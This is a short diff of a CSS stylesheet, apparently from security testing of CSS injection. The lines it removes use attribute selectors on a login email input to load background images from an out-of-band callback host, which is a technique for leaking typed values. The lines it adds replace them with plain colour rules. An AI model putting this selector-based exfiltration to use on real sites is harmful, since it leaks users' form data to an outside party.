@@ -1,13 +1,16 @@
 <style>
-input[name="email"][value="example@example.com"] {
-      background: url(https://wbavhjqlakgrcdefcgdvyng5hobpxsl3y.oast.fun?pin=example@example.com);
+input[value^="a"]{
+      color:blue;
+}
+input[name="email"][value^="a"] {
+      color:yellow;
 }
 #login-email[value^="a"] {
-   --value: url(https://wbavhjqlakgrcdefcgdvyng5hobpxsl3y.oast.fun?pin=example@example.com);
+   color:red;
 }
-#login-email {
-   background:var(--value,none);
-}
+/*#login-email {
+   color:black;
+}*/
 label[for="login-email"] {
       color:blue;
 }
